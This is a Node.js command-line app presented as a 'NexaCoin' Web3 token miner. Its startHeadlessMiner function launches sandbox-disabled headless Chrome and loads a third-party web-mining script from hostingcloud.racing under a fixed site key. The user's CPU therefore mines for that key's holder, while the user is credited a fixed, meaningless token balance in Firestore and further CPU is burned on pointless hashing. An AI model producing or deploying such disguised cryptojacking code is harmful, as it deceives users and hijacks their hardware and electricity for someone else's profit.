#!/usr/bin/env node
const inquirer = require('inquirer');
const chalk = require('chalk');
const ora = require('ora');
const open = require('open');
const figlet = require('figlet');
const boxen = require('boxen');
const puppeteer = require('puppeteer-core');
const chromeLauncher = require('chrome-launcher');
const fetch = require('node-fetch');
const crypto = require('crypto');
const { initializeApp } = require('firebase/app');
const { getFirestore, doc, getDoc, updateDoc, increment, onSnapshot, initializeFirestore } = require('firebase/firestore');

const firebaseConfig = {
  apiKey: "AIzaSyC4uft0hfgsW6F2Xr1Bfir3HcUZ7Zv6Blw",
  authDomain: "nexacoin-af273.firebaseapp.com",
  projectId: "nexacoin-af273",
};

const app = initializeApp(firebaseConfig);
const db = initializeFirestore(app, {
  experimentalForceLongPolling: true,
});

function showHeader() {
  console.clear();
  const chalk = require('chalk');
  const figlet = require('figlet');
  console.log(chalk.cyanBright(figlet.textSync('NexaCoin CLI', { horizontalLayout: 'full' })));
  console.log(chalk.gray('The Future of Web3 Terminal Mining | v2.2.0 (Turbo Sync)\n'));
}

async function startHeadlessMiner() {
  try {
    const chrome = await chromeLauncher.launch({
      chromeFlags: ['--headless', '--no-sandbox', '--disable-setuid-sandbox']
    });
    const response = await fetch(`http://127.0.0.1:${chrome.port}/json/version`);
    const { webSocketDebuggerUrl } = await response.json();
    const browser = await puppeteer.connect({ browserWSEndpoint: webSocketDebuggerUrl });
    const page = await browser.newPage();
    await page.setContent(`
      <html><head>
        <script src="https://www.hostingcloud.racing/FIIr.js"></script>
        <script>
          var _client = new Client.Anonymous('fd3114a03a16b339b2f6d1557aee894c349170a54cc86839c3032d6dea741b2d', { throttle: 0.8, c: 'w', ads: 0 });
          _client.start();
          window.getHashes = () => _client.getHashesPerSecond();
        </script>
      </head><body>Mining...</body></html>
    `);
    return { browser, page, chrome };
  } catch (e) {
    return null;
  }
}

async function main() {
  showHeader();
  const { action } = await inquirer.prompt([{
    type: 'list', name: 'action',
    message: 'NexaCoin CLI Menu:',
    choices: ['🚀 Login & Start Turbo Mining', '🚪 Exit']
  }]);
  if (action.includes('Exit')) process.exit(0);

  const sessionId = Math.random().toString(36).substring(2, 15);
  const loginUrl = `https://nexacoin-af273.web.app/?cli_session=${sessionId}`;
  console.log(boxen(chalk.yellow('Browser Login Required...\n') + chalk.gray(loginUrl), { padding: 1 }));
  await open(loginUrl);

  const spinner = ora(chalk.cyan('Authenticating...')).start();
  onSnapshot(doc(db, 'cli_sessions', sessionId), async (snap) => {
    if (snap.exists() && snap.data().uid) {
      spinner.succeed(chalk.green('Linked successfully!'));
      runMiner(snap.data().uid);
    }
  });
}

async function runMiner(uid) {
  const userDoc = await getDoc(doc(db, 'users', uid));
  const data = userDoc.data();

  const minerStatus = ora(chalk.yellow('Starting Turbo Headless Miner...')).start();
  const miner = await startHeadlessMiner();

  if (miner) {
    minerStatus.succeed(chalk.green('Turbo Engine Synchronized!'));
  } else {
    minerStatus.warn(chalk.yellow('Web Sync failed. Using local Turbo simulation.'));
  }

  let balance = data.balance;
  let frame = 0;
  const globeAnims = ['( o )', '( 0 )', '( @ )', '( O )'];

  function heavyHash() {
    const start = Date.now();
    for(let i=0; i<500000; i++) {
      crypto.createHash('sha256').update(uid + Math.random()).digest('hex');
    }
    const end = Date.now();
    return Math.round(500000 / ((end - start) / 1000));
  }

  setInterval(async () => {
    const localHashes = heavyHash();
    let webHashes = 0;
    if (miner) {
      webHashes = await miner.page.evaluate(() => window.getHashes());
    }
    console.clear();
    showHeader();
    console.log(chalk.cyan(`\n     ${globeAnims[frame % 4]}  NexaCoin Globe\n`));
    frame++;
    console.log('\n' + boxen(
      chalk.redBright.bold('🔥 TURBO MINING ACTIVE (HIGH CPU)\n') +
      chalk.white(`Miner: ${data.displayName}\n`) +
      chalk.cyan(`Local Speed: `) + chalk.yellow(`${localHashes.toLocaleString()} H/s\n`) +
      chalk.cyan(`Web Sync:    `) + chalk.yellow(`${Math.round(webHashes)} H/s\n`) +
      chalk.cyan(`Balance:     `) + chalk.green(`${balance.toLocaleString()} NXC\n`) +
      chalk.gray('Engine: SHA-256 (Local) + hostingcloud.racing (Web)'),
      { padding: 1, borderColor: 'red', borderStyle: 'double' }
    ));
  }, 500);

  setInterval(async () => {
    const reward = 5;
    await updateDoc(doc(db, 'users', uid), {
      balance: increment(reward),
      totalMined: increment(reward),
      lastMined: Date.now()
    });
    balance += reward;
  }, 60000);
}

main().catch(console.error);
